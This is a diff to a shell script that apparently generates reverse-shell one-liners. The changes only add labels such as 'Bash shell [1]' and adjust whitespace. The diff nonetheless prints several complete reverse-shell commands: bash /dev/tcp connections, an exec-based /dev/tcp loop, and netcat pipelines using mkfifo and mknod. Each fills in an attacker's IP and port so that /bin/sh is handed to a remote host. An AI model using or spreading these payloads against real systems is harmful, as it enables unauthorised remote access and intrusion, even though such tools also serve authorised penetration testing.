@@ -88,9 +88,9 @@ function reverse_shell_list(){
 function bash_shell(){
 
 	echo -e "${pos}${Yellow}Bash shell:${Color_Off}"
-	echo -e "bash -i >& /dev/tcp/${Red}$ipaddr/$port${Color_Off} 0>&1"
-	echo -e "exec 5<>/dev/tcp/${Red}$ipaddr/$port${Color_Off};cat <&5 | while read line; do $line 2>&5 >&5; done"
-	echo -e "exec /bin/sh 0</dev/tcp/${Red}$ipaddr/$port${Color_Off} 1>&0 2>&0 0<&196;exec 196<>/dev/tcp/<IP>/<PORT>; sh <&196 >&196 2>&196"
+	echo -e "${pos}${Yellow}Bash shell [1]:${Color_Off}bash -i >& /dev/tcp/${Red}$ipaddr/$port${Color_Off} 0>&1"
+	echo -e "${pos}${Yellow}Bash shell [2]:${Color_Off}exec 5<>/dev/tcp/${Red}$ipaddr/$port${Color_Off};cat <&5 | while read line; do $line 2>&5 >&5; done"
+	echo -e "${pos}${Yellow}Bash shell [3]:${Color_Off}exec /bin/sh 0</dev/tcp/${Red}$ipaddr/$port${Color_Off} 1>&0 2>&0 0<&196;exec 196<>/dev/tcp/<IP>/<PORT>; sh <&196 >&196 2>&196"
 }
 
 function perl_shell(){
@@ -123,7 +123,7 @@ function netcat_shell(){
 	
 	echo -e "${pos}${Yellow}Netcat shell [2]:${Color_Off} rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${Red}$ipaddr $port${Color_Off} >/tmp/f\n"
 
-        echo -e "${pos}${Yellow}Netcat shell [3]:${Color_Off} rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc ${Red}$ipaddr $port${Color_Off} 1>/tmp/l"
+    echo -e "${pos}${Yellow}Netcat shell [3]:${Color_Off} rm /tmp/l;mknod /tmp/l p;/bin/sh 0</tmp/l | nc ${Red}$ipaddr $port${Color_Off} 1>/tmp/l"
 }
 
 function java_shell(){
